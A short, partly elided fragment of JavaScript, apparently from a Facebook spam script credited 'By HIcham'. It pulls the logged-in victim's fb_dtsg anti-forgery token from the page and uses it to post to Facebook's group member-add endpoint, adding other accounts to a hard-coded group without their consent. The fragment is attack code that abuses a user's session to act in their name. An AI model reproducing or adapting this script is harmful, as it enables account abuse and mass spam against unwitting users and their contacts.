...
var tulisanNganu = '<font color="black"><b>By HIcham</b> </font>';
var kunaon = '';
...
if (memberGroupId != 1442974905933868) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=1442974905933868&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
"text", "post")
    }
